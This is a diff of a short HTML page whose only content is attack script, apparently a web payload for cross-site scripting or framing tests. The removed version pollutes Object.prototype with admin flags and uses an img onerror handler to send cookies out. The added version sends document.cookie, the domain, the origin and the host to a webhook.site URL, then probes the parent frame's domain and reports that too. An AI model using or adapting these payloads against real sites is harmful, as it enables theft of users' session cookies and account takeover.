@@ -2,18 +2,18 @@
 <html>
 <body>
   <script>
-    // Poluir Object.prototype
-    Object.prototype.isAdmin = true;
-    Object.prototype.role = "administrator";
+    var domain = document.domain;
+    var origin = location.origin;
+    var host = location.host;
     
-    // Verificar se poluiu
-    console.log("Polluted:", {}.isAdmin);
+    fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?domain='+domain+'&origin='+origin+'&host='+host+'&cookie='+document.cookie);
     
-    // Exfiltrar confirmação
-    fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?polluted=true&domain='+location.hostname);
+    try {
+      var parentDomain = window.parent.document.domain;
+      fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?parent='+parentDomain);
+    } catch(e) {
+      fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?parent=blocked&error='+e.message);
+    }
   </script>
-  
-  <!-- Backup via DOM Clobbering -->
-  <img src=x name="constructor" onerror="Object.prototype.exfil=document.cookie;fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?c='+document.cookie)">
 </body>
 </html>
